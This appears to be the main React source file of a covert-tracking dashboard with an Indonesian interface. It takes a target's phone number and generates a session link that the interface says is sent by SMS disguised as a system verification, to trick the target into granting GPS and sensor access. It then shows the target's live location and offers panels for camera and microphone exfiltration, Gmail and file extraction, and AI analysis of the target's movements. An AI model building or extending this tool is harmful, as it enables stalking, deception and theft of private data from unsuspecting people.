
import React, { useState, useEffect, useRef } from 'react';
import Sidebar from './components/Sidebar';
import LiveMap from './components/LiveMap';
import TrackerClient from './components/TrackerClient';
import Terminal from './components/Terminal';
import SensorHub from './components/SensorHub';
import DataVault from './components/DataVault';
import Blueprints from './components/Blueprints';
import Compliance from './components/Compliance';
import LandingPage from './components/LandingPage';
import LoginPage from './components/LoginPage';
import AIAssistant from './components/AIAssistant';
import { onLocationUpdate, TrackingData } from './services/realtime';
import { analyzeMovementPattern } from './services/geminiService';
import { Device, DeviceStatus } from './types';
import { 
  Activity, Send, Phone, MapPin, ExternalLink, 
  Info, Bell, Target, Terminal as TerminalIcon, 
  Globe, Fingerprint, Zap, Crosshair, LogOut
} from 'lucide-react';

export interface SensorHandle {
  start: (type: 'camera' | 'screen') => void;
  stop: () => void;
}

const App: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return localStorage.getItem('shdw_auth') === 'true';
  });
  const [showLogin, setShowLogin] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState('dashboard');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isSendingSms, setIsSendingSms] = useState(false);
  const [trackingSession, setTrackingSession] = useState<{id: string, phone: string} | null>(null);
  const [liveTrackingData, setLiveTrackingData] = useState<TrackingData | null>(null);
  const [aiAnalysis, setAiAnalysis] = useState<string>("");
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [vaultCategory, setVaultCategory] = useState<'gmail' | 'files'>('gmail');

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const session = params.get('session');
    if (session) {
      setSessionId(session);
    }
  }, []);

  useEffect(() => {
    const cleanup = onLocationUpdate((data) => {
      setLiveTrackingData(data);
    });
    return cleanup;
  }, []);

  const handleLoginSuccess = () => {
    setIsAuthenticated(true);
    localStorage.setItem('shdw_auth', 'true');
    setShowLogin(false);
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem('shdw_auth');
    setActiveTab('dashboard');
  };

  const handleStartTracking = (num?: string) => {
    const targetNum = num || phoneNumber;
    if (!targetNum || targetNum.length < 8) {
      alert("GALAT: FORMAT_NOMOR_TIDAK_VALID");
      return;
    }

    if (num) setPhoneNumber(targetNum);
    setIsSendingSms(true);
    setTimeout(() => {
      const id = 'shdw_' + Math.random().toString(36).substring(2, 9);
      setTrackingSession({ id, phone: targetNum });
      setIsSendingSms(false);
      setActiveTab('devices');
    }, 1500);
  };

  const handleAIControlSensor = (type: 'camera' | 'screen', action: 'start' | 'stop') => {
    setActiveTab('sensors');
    setTimeout(() => {
      if (window.dispatchEvent) {
        window.dispatchEvent(new CustomEvent('control-sensor', { detail: { type, action } }));
      }
    }, 200);
  };

  const handleAIControlVault = (category: 'gmail' | 'files') => {
    setActiveTab('vault');
    setVaultCategory(category);
  };

  const getTrackingLink = () => {
    if (!trackingSession) return '';
    const baseUrl = window.location.href.split('?')[0];
    return `${baseUrl}?session=${trackingSession.id}`;
  };

  const runAnalysis = async () => {
    if (!liveTrackingData) return;
    setIsAnalyzing(true);
    setAiAnalysis("AI_TAKTIKAL: MENGANALISIS_TELEMETRI...");
    
    const mockDevice: Device = {
        id: 'remote',
        name: `TARGET_0X${trackingSession?.phone.slice(-4)}`,
        type: 'phone',
        status: DeviceStatus.ONLINE,
        lastSeen: new Date().toISOString(),
        battery: 88,
        location: { lat: liveTrackingData.lat, lng: liveTrackingData.lng }
    };
    
    const history = [{ timestamp: new Date().toISOString(), lat: liveTrackingData.lat, lng: liveTrackingData.lng }];
    const result = await analyzeMovementPattern(mockDevice, history);
    setAiAnalysis(result);
    setIsAnalyzing(false);
  };

  if (sessionId) {
    return <TrackerClient sessionId={sessionId} />;
  }

  if (!isAuthenticated) {
    return showLogin ? (
      <LoginPage onLoginSuccess={handleLoginSuccess} onBack={() => setShowLogin(false)} />
    ) : (
      <LandingPage onEnter={() => setShowLogin(true)} />
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] flex scanline-effect overflow-hidden">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      
      <main className="flex-1 ml-20 lg:ml-64 flex flex-col h-screen relative transition-all duration-300">
        <header className="px-8 py-4 bg-black/40 border-b border-white/5 flex justify-between items-center z-40 backdrop-blur-md">
          <div className="flex items-center gap-4">
            <div className="h-10 w-[2px] bg-cyan-500 shadow-[0_0_10px_#00d4ff]"></div>
            <div>
              <h2 className="text-sm mono font-black text-white tracking-[0.3em] uppercase italic">
                {activeTab === 'dashboard' ? 'PUSAT_KENDALI_UTAMA' : 
                 activeTab === 'sensors' ? 'INTEL_SENSOR_AKTIF' :
                 activeTab === 'vault' ? 'EKSTRAKSI_DATA_SENSITIF' : 
                 activeTab === 'blueprints' ? 'ARSIP_KODE_TEKNIS' :
                 activeTab === 'compliance' ? 'PROTOKOL_KEPATUHAN' : 'SURVEILANS_SIGINT'}
              </h2>
              <div className="flex items-center gap-2">
                <span className="text-[10px] text-slate-500 font-bold uppercase mono">Sesi: ADMIN_SHADOW</span>
                <span className="text-[10px] text-emerald-500 mono font-black animate-pulse uppercase">● Terenkripsi</span>
              </div>
            </div>
          </div>
          
          <div className="flex items-center gap-6">
             <div className="hidden lg:flex flex-col items-end">
                <span className="text-[10px] mono text-slate-500 uppercase tracking-widest">Muatan_Data</span>
                <span className="text-xs mono text-cyan-400 font-bold">12.4 TB/INF</span>
             </div>
             <button 
                onClick={handleLogout}
                className="p-2 bg-rose-500/10 border border-rose-500/20 rounded text-rose-500 hover:bg-rose-500 hover:text-white transition-all flex items-center gap-2"
                title="Keluar"
             >
               <LogOut size={18} />
               <span className="text-[10px] font-black mono hidden lg:block uppercase">Logout</span>
             </button>
          </div>
        </header>

        <div className="flex-1 overflow-y-auto p-8 bg-[radial-gradient(circle_at_50%_50%,rgba(6,182,212,0.03),transparent)] scroll-smooth">
          {activeTab === 'dashboard' && (
            <div className="grid grid-cols-12 gap-6 h-full animate-in fade-in duration-500">
              <div className="col-span-12 lg:col-span-5 flex flex-col gap-6">
                <div className="bg-[#0f172a]/40 border border-white/5 rounded-2xl p-8 glass overflow-hidden relative group">
                  <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                    <Target size={120} />
                  </div>
                  
                  <div className="flex items-center gap-3 mb-8">
                    <div className="w-12 h-12 bg-white/5 rounded flex items-center justify-center text-cyan-400 border border-cyan-500/20 shadow-[0_0_15px_rgba(6,182,212,0.1)]">
                      <Phone size={24} />
                    </div>
                    <div>
                      <h3 className="font-black text-white text-lg tracking-widest mono uppercase italic">Infiltrasi_Target</h3>
                      <p className="text-[10px] text-slate-500 mono">Pemicu akses via Social Engineering Bridge</p>
                    </div>
                  </div>

                  <div className="space-y-6">
                    <div className="relative group">
                      <div className="absolute inset-0 bg-cyan-500/5 blur opacity-0 group-focus-within:opacity-100 transition-opacity"></div>
                      <span className="absolute left-5 top-1/2 -translate-y-1/2 font-black text-cyan-500 mono text-sm">+62</span>
                      <input 
                        type="tel" 
                        placeholder="8XX_XXX_XXX"
                        className="w-full pl-16 pr-5 py-5 bg-black/40 border border-white/10 rounded-xl focus:border-cyan-500 focus:outline-none mono text-white placeholder:text-white/10 text-lg transition-all"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                      />
                    </div>

                    <button 
                      onClick={() => handleStartTracking()}
                      disabled={isSendingSms}
                      className="w-full py-5 bg-cyan-600 hover:bg-cyan-500 text-black font-black rounded-xl tracking-[0.2em] mono uppercase transition-all shadow-[0_0_20px_rgba(6,182,212,0.3)] hover:shadow-[0_0_30px_rgba(6,182,212,0.5)] active:scale-[0.98] disabled:opacity-50 flex items-center justify-center gap-3"
                    >
                      {isSendingSms ? <div className="w-5 h-5 border-2 border-black/20 border-t-black rounded-full animate-spin" /> : <Send size={20} />}
                      {isSendingSms ? 'MENYEBARKAN...' : 'EKSEKUSI_PAYLOAD'}
                    </button>

                    <div className="p-4 bg-cyan-500/5 border border-cyan-500/10 rounded-xl flex gap-4">
                      <Info size={16} className="text-cyan-500 shrink-0 mt-1" />
                      <p className="text-[10px] mono text-cyan-500/80 leading-relaxed uppercase font-medium italic">Sistem akan mengirimkan pesan berisi tautan yang menyamar sebagai verifikasi sistem untuk memperoleh akses GPS dan Sensor.</p>
                    </div>
                  </div>
                </div>

                <div className="flex-1">
                  <Terminal />
                </div>
              </div>

              <div className="col-span-12 lg:col-span-7 flex flex-col gap-6">
                 <div className="grid grid-cols-2 gap-6">
                    <div className="bg-white/5 border border-white/5 rounded-2xl p-6 glass">
                       <div className="flex items-center gap-3 mb-4">
                          <Globe size={18} className="text-cyan-500" />
                          <span className="text-[10px] mono font-bold text-slate-500 uppercase tracking-widest">Node_Proxy</span>
                       </div>
                       <div className="text-2xl font-black text-white mono italic">1,842 <span className="text-cyan-500 text-xs">ONLINE</span></div>
                    </div>
                    <div className="bg-white/5 border border-white/5 rounded-2xl p-6 glass">
                       <div className="flex items-center gap-3 mb-4">
                          <Fingerprint size={18} className="text-rose-500" />
                          <span className="text-[10px] mono font-bold text-slate-500 uppercase tracking-widest">Anonimitas</span>
                       </div>
                       <div className="text-2xl font-black text-white mono italic">99% <span className="text-rose-500 text-xs tracking-tighter italic">TERSEMBUNYI</span></div>
                    </div>
                 </div>

                 <div className="flex-1 bg-[#0a0a0a] border border-white/10 rounded-2xl p-8 relative overflow-hidden group">
                    <div className="absolute top-0 right-0 w-full h-full bg-[radial-gradient(circle_at_center,rgba(0,212,255,0.05),transparent)] opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <h3 className="text-2xl font-black text-white mb-6 flex items-center gap-4 italic tracking-tighter">
                       <Zap className="text-cyan-500 fill-cyan-500" /> KEMAMPUAN_INTELIJEN
                    </h3>
                    <div className="space-y-6 relative z-10">
                       <div className="p-5 bg-black/40 border border-white/5 rounded-xl border-l-4 border-l-cyan-500 group-hover:border-l-emerald-500 transition-all">
                          <h4 className="text-xs font-black text-cyan-400 mono mb-2 uppercase tracking-widest">Eksfiltrasi Audio & Video</h4>
                          <p className="text-[11px] text-slate-400 mono leading-relaxed uppercase">Membuka saluran aliran data kamera depan dan mikrofon secara bersamaan menggunakan protokol WebRTC.</p>
                       </div>
                       <div className="p-5 bg-black/40 border border-white/5 rounded-xl border-l-4 border-l-rose-500">
                          <h4 className="text-xs font-black text-rose-400 mono mb-2 uppercase tracking-widest">Dump Memori & Email</h4>
                          <p className="text-[11px] text-slate-400 mono leading-relaxed uppercase italic">Menganalisis cache browser dan API OAuth untuk mengekstrak pesan Gmail dan file lokal dari penyimpanan.</p>
                       </div>
                    </div>
                 </div>
              </div>
            </div>
          )}

          {activeTab === 'sensors' && <div className="h-full animate-in slide-in-from-right-10 duration-500"><SensorHub /></div>}
          {activeTab === 'vault' && <div className="h-full animate-in zoom-in-95 duration-500"><DataVault initialCategory={vaultCategory} /></div>}
          {activeTab === 'blueprints' && <div className="h-full animate-in slide-in-from-bottom-10 duration-500"><Blueprints /></div>}
          {activeTab === 'compliance' && <div className="h-full animate-in fade-in duration-500"><Compliance /></div>}

          {activeTab === 'devices' && (
            <div className="grid grid-cols-12 gap-6 h-[calc(100vh-160px)] animate-in fade-in duration-500">
              <div className="col-span-12 lg:col-span-4 flex flex-col gap-6">
                <div className="bg-[#0f172a]/40 glass border border-white/5 rounded-2xl p-6 flex flex-col h-full overflow-hidden">
                  <h3 className="font-black text-white mono text-xs tracking-[0.4em] mb-6 flex items-center justify-between uppercase">
                    Intel_Target
                    {liveTrackingData && <span className="flex items-center gap-1.5 text-[9px] text-cyan-400 mono animate-pulse border border-cyan-400/30 px-2 py-0.5 rounded italic">UPLINK_AKTIF</span>}
                  </h3>
                  
                  {!trackingSession ? (
                    <div className="flex-1 flex flex-col items-center justify-center opacity-10">
                      <Target size={80} />
                      <p className="text-xs mono mt-4">TIDAK_ADA_SASARAN</p>
                    </div>
                  ) : (
                    <div className="space-y-6 flex-1">
                      <div className="bg-black/60 p-5 rounded-xl border border-white/5 relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-16 h-16 bg-cyan-500/5 rounded-full -mr-8 -mt-8"></div>
                        <p className="text-[9px] text-slate-500 mono font-black uppercase mb-2 tracking-widest">Telepon_Target</p>
                        <p className="text-2xl font-black text-white mono italic tracking-tighter">+62 {trackingSession.phone.slice(0, 3)} {trackingSession.phone.slice(3, 7)} XXXX</p>
                      </div>

                      {!liveTrackingData ? (
                        <div className="space-y-4">
                          <div className="bg-rose-500/5 border border-rose-500/20 p-5 rounded-xl">
                            <p className="text-[10px] text-rose-400 mono font-bold mb-2 uppercase tracking-widest">Menunggu Interaksi</p>
                            <p className="text-[11px] text-rose-300 mono leading-relaxed italic">Payload dikirim. Klik tautan simulasi di bawah untuk memberikan izin akses sensor dan lokasi.</p>
                          </div>
                          <button 
                            onClick={() => window.open(getTrackingLink(), '_blank')}
                            className="w-full py-4 bg-white/5 border border-cyan-500/30 text-cyan-400 rounded-xl font-black mono text-xs uppercase tracking-widest hover:bg-cyan-500/10 transition-all shadow-[0_0_15px_rgba(6,182,212,0.1)] flex items-center justify-center gap-3"
                          >
                            <ExternalLink size={16} /> BUKA_GERBANG_TARGET
                          </button>
                        </div>
                      ) : (
                        <div className="space-y-4">
                          <div className="grid grid-cols-2 gap-4">
                            <div className="bg-black/40 p-4 rounded-xl border border-white/5">
                              <p className="text-[9px] text-slate-500 mono font-bold uppercase mb-1">Kecepatan</p>
                              <p className="text-lg font-black text-white mono italic">{(liveTrackingData.speed || 0 * 3.6).toFixed(1)} <span className="text-[10px] text-cyan-400 uppercase">km/h</span></p>
                            </div>
                            <div className="bg-black/40 p-4 rounded-xl border border-white/5">
                              <p className="text-[9px] text-slate-500 mono font-bold uppercase mb-1">Akurasi</p>
                              <p className="text-lg font-black text-white mono italic">±{liveTrackingData.accuracy.toFixed(0)} <span className="text-[10px] text-cyan-400 uppercase">m</span></p>
                            </div>
                          </div>
                          
                          <div className="bg-cyan-500/5 border border-cyan-500/10 p-5 rounded-xl">
                             <div className="flex items-center justify-between mb-3">
                                <span className="text-[10px] text-cyan-500 mono font-bold">STABILITAS_UPLINK</span>
                                <span className="text-[10px] text-cyan-500 mono">{(liveTrackingData.accuracy > 10 ? 45 : 98)}%</span>
                             </div>
                             <div className="w-full h-1 bg-white/5 rounded-full overflow-hidden">
                                <div className="bg-cyan-500 h-full transition-all duration-1000" style={{ width: `${(liveTrackingData.accuracy > 10 ? 45 : 98)}%` }}></div>
                             </div>
                          </div>

                          <button 
                            onClick={runAnalysis}
                            disabled={isAnalyzing}
                            className="w-full py-5 bg-white text-black rounded-xl font-black mono text-[10px] uppercase tracking-[0.2em] flex items-center justify-center gap-3 hover:bg-cyan-400 transition-colors"
                          >
                            {isAnalyzing ? <div className="w-4 h-4 border-2 border-black/20 border-t-black rounded-full animate-spin" /> : <Activity size={16} />}
                            MINTA_LAPORAN_TAKTIKAL
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                  
                  {aiAnalysis && (
                    <div className="mt-6 bg-[#1a1a1a] p-5 rounded-xl border border-white/10 shadow-2xl relative overflow-hidden animate-in zoom-in-95">
                      <div className="absolute top-0 right-0 p-3 opacity-10">
                        <TerminalIcon size={40} />
                      </div>
                      <div className="flex items-center gap-2 mb-3">
                        <Activity size={14} className="text-cyan-400" />
                        <span className="text-[9px] font-black uppercase mono text-cyan-400 tracking-widest italic">ANALISIS_AI_BERHASIL</span>
                      </div>
                      <p className="text-[10px] mono leading-relaxed text-slate-300 italic">"{aiAnalysis}"</p>
                    </div>
                  )}
                </div>
              </div>

              <div className="col-span-12 lg:col-span-8 bg-black p-1 rounded-2xl border border-white/5 shadow-2xl overflow-hidden relative">
                 <LiveMap trackingData={liveTrackingData} />
                 
                 <div className="absolute top-6 left-6 z-20 pointer-events-none">
                    <div className="bg-black/60 backdrop-blur-md p-4 rounded-xl border border-white/10 border-l-4 border-l-cyan-500">
                       <h3 className="text-[10px] font-black text-cyan-400 mono tracking-[0.3em] uppercase mb-1">PEMINDAIAN_AREA_PROAKTIF</h3>
                       <p className="text-[9px] text-slate-500 mono font-bold italic uppercase tracking-tighter">Enkripsi_P2P_AKTIF</p>
                    </div>
                 </div>

                 <div className="absolute bottom-6 left-6 z-20 flex gap-4 pointer-events-none">
                    {liveTrackingData && (
                      <div className="bg-black/80 backdrop-blur-lg p-4 rounded-xl border border-white/10 flex items-center gap-4 animate-in slide-in-from-left-4">
                        <div className="p-2 bg-cyan-500/10 rounded border border-cyan-500/30 text-cyan-400">
                          <MapPin size={20} />
                        </div>
                        <div>
                          <p className="text-[9px] text-slate-500 mono uppercase font-bold tracking-widest mb-1">LOKASI_PRESEISI</p>
                          <p className="text-xs font-mono font-black text-white italic">{liveTrackingData.lat.toFixed(6)}N | {liveTrackingData.lng.toFixed(6)}E</p>
                        </div>
                      </div>
                    )}
                 </div>

                 {!liveTrackingData && (
                   <div className="absolute inset-0 z-10 flex items-center justify-center bg-black/40 backdrop-blur-[2px]">
                      <div className="flex flex-col items-center gap-4">
                         <div className="relative">
                            <div className="w-16 h-16 border-2 border-cyan-500/20 rounded-full animate-ping absolute"></div>
                            <div className="w-16 h-16 border border-cyan-500/40 rounded-full flex items-center justify-center relative bg-black/60">
                               <Crosshair className="text-cyan-500" size={24} />
                            </div>
                         </div>
                         <p className="text-[10px] mono text-cyan-400 font-black tracking-[0.4em] uppercase animate-pulse">MEMINDAI_SINYAL_SASARAN...</p>
                      </div>
                   </div>
                 )}
              </div>
            </div>
          )}
        </div>
        <AIAssistant 
          onNavigate={setActiveTab} 
          onTrack={handleStartTracking}
          onSensor={handleAIControlSensor}
          onVault={handleAIControlVault}
        />
      </main>
    </div>
  );
};

export default App;
